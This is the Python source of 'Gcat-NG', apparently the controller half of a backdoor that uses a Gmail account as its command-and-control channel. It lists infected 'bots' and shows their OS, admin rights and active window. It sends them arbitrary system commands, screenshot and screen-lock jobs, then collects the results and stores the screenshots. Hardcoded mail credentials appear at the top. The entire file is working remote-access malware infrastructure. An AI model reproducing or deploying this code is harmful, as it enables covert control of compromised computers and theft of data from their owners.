import argparse
import email
import imaplib
import sys
import uuid
import string
import ast
import os
import random

from datetime import datetime
from base64 import b64decode
from smtplib import SMTP
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders

#######################################
gmail_user = 'gcat.test.mofo@gmail.com'
gmail_pwd = 'prettyflypassword'
server = "smtp.gmail.com"
server_port = 587
#######################################

def genJobID(slen=7):
    return ''.join(random.sample(string.ascii_letters + string.digits, slen))

class msgparser:

    def __init__(self, msg_data):
        self.attachment = None
        self.getPayloads(msg_data)
        self.getSubjectHeader(msg_data)
        self.getDateHeader(msg_data)

    def getPayloads(self, msg_data):
        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
            if payload.get_content_maintype() == 'text':
                self.text = payload.get_payload()
                self.dict = ast.literal_eval(payload.get_payload())

            elif payload.get_content_maintype() == 'application':
                self.attachment = payload.get_payload()

    def getSubjectHeader(self, msg_data):
        self.subject = email.message_from_string(msg_data[1][0][1])['Subject']

    def getDateHeader(self, msg_data):
        self.date = email.message_from_string(msg_data[1][0][1])['Date']

class Gcat:

    def __init__(self):
        self.c = imaplib.IMAP4_SSL(server)
        self.c.login(gmail_user, gmail_pwd)

    def sendEmail(self, botid, jobid, cmd, arg='', attachment=[]):
        msg = MIMEMultipart()
        msg['From'] = 'gcat:{}:{}'.format(botid, jobid)
        msg['To'] = gmail_user
        msg['Subject'] = 'gcat:{}:{}'.format(botid, jobid)
        msgtext = {'CMD': cmd, 'ARG': arg}
        msg.attach(MIMEText(str(msgtext)))
        
        for attach in attachment:
            if os.path.exists(attach) == True:  
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(open(attach, 'rb').read())
                Encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                msg.attach(part)

        mailServer = SMTP()
        mailServer.connect(server, server_port)
        mailServer.starttls()
        mailServer.login(gmail_user,gmail_pwd)
        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
        mailServer.quit()

        print "[*] Command sent successfully with job id: {}".format(jobid)


    def checkBots(self):
        bots = []
        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:')")

        for idn in idlist[0].split():
            msg_data = self.c.uid('fetch', idn, '(RFC822)')
            msg = msgparser(msg_data)
            
            try:
                botid = str(uuid.UUID(msg.subject.split(':')[1]))
                if botid not in bots:
                    bots.append(botid)
                    
                    print botid, msg.dict['SYS']
            
            except ValueError:
                pass

    def getBotInfo(self, botid):

        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:{}')".format(botid))

        for idn in idlist[0].split():
            msg_data = self.c.uid('fetch', idn, '(RFC822)')
            msg = msgparser(msg_data)
            
            print "ID: " + botid
            print "DATE: '{}'".format(msg.date)
            print "OS: " + msg.dict['SYS']
            print "ADMIN: " + str(msg.dict['ADMIN']) 
            print "FG WINDOW: '{}'".format(msg.dict['FGWINDOW'])
            
            return

    def getJobResults(self, botid, jobid):
        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'imp:{}:{}')".format(botid, jobid))

        for idn in idlist[0].split():
            msg_data = self.c.uid('fetch', idn, '(RFC822)')
            msg = msgparser(msg_data)

            print "DATE: '{}'".format(msg.date)
            print "JOBID: " + jobid
            print "CMD: '{}'".format(msg.dict['MSG']['CMD'])
            print ''
            print msg.dict['MSG']['RES']

            if msg.attachment:

                if msg.dict['MSG']['CMD'] == 'screenshot':
                    imgname = '{}-{}.png'.format(botid, jobid)
                    with open("./data/" + imgname, 'wb') as image:
                        image.write(b64decode(msg.attachment))
                        image.close()

                    print "[*] Screenshot saved to ./data/" + imgname
            return

    def logout():
        self.c.logout()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Gcat-NG", version='0.0.1')
    parser.add_argument("-l", dest="list", action="store_true", help="List available clients")
    parser.add_argument("--id", dest='id', default='ALL', type=str, help="Client to target")
    parser.add_argument('--job-id', dest='jobid', type=str, help='Job id to retrieve')
    parser.add_argument("-i", dest='info', action='store_true', help='Retrieve info on specified client')
    parser.add_argument("-c", metavar='cmd', dest='cmd', type=str, help='Execute a system command')
    parser.add_argument("-s", dest='screen', action='store_true', help='Take a screenshot')
    parser.add_argument("-L", dest='lockscreen', action='store_true', help='Lock the clients screen')
    
    if len(sys.argv) is 1:
        parser.print_help()
        sys.exit()

    args = parser.parse_args()
    
    gcat = Gcat()
    jobid = genJobID()

    if args.list:
        gcat.checkBots()

    elif args.info:
        gcat.getBotInfo(args.id)

    elif args.cmd:
        gcat.sendEmail(args.id, jobid, 'cmd', args.cmd)

    elif args.screen:
        gcat.sendEmail(args.id, jobid, 'screenshot')

    elif args.lockscreen:
        gcat.sendEmail(args.id, jobid, 'lockscreen')

    elif args.jobid:
        gcat.getJobResults(args.id, args.jobid)
